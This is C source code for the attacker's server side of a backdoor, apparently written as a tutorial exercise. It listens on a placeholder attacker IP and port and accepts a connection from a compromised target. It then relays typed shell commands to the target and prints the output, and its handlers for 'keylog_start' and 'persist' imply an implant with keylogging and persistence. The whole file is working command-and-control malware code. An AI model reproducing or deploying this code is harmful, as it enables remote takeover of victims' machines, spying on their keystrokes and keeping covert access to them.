#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>


int main(){

	int sock,client_socket;
//we store client socket as when the the target connects the server ,it stores client's socket too 
	char buffer[1024]; //storage 
	char response[18384]; //response (must be equal to total response
	//structure of the socket 
	struct sockaddr_in server_address,client_address;
	//we need to create for the server (for backdoor-1)	
	int i=0;
	int optval=1;    // we store the result here
	socklen_t client_length;
	
	sock=socket(AF_INET,SOCK_STREAM,0);
	
	//setting up some of the socket option 
	//in order if the setting of our socket object worked we use the statement below 
	if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,&optval,sizeof(optval))<0){
		//something is wrong with the setup
		printf("Error Setting TCP Socket Options!\n");
		return 1;
	}
		//setup the server address with it's parameters
		//we need ip-address and port number 
		server_address.sin_family=AF_INET;
		server_address.sin_addr.s_addr=inet_addr("<attacker-IP machine>");
		server_address.sin_port=htons(<PORT-No>);
		
		//binding the server-ip and the server-port
		bind(sock,(struct sockaddr *) &server_address,sizeof(server_address));
		//listen for incoming connections
		listen(sock,5);  //the socket from which the attacker is listening and the amt of connections the attacker wabts to accept  
		client_length=sizeof(client_address); //length of the client address

		//accepting the connection request
		//accept function will return the client socket
		//for the communication with the target 
		client_socket=accept(sock,(struct sockaddr *) &client_address,&client_length);
		
		//send the commands and iterate it over different tasks 
		while(1){
			//
			jump:
			bzero(&buffer,sizeof(buffer));
			bzero(&response,sizeof(response));
	//server->backdoor()<-response(string)
			printf("* Shell#%s~$: ",inet_ntoa(client_address.sin_addr));  //contains ip-address of the target 
			//wait for the user of the server to input a command and we need to store it somewhere (buffer)			
			fgets(buffer,sizeof(buffer),stdin);
			strtok(buffer,"\n"); //for elimination of \n		
			//send the command to the target 
			write(client_socket,buffer,sizeof(buffer));
			if(strncmp("q",buffer,1)==0){
				break;
			}
			else if(strncmp("cd ",buffer,3)==0){
				goto jump;
			}
			else if(strncmp("keylog_start",buffer,12)==0){
				goto jump;

			}
			else if(strncmp("persist",buffer,7)==0){
			          recv(client_socket,response,sizeof(response),0);
			          printf("%s",response);
			
			}

			//receive the response of the target
			else{
				recv(client_socket,response,sizeof(response),MSG_WAITALL);
				printf("%s",response);
			}



			}
}
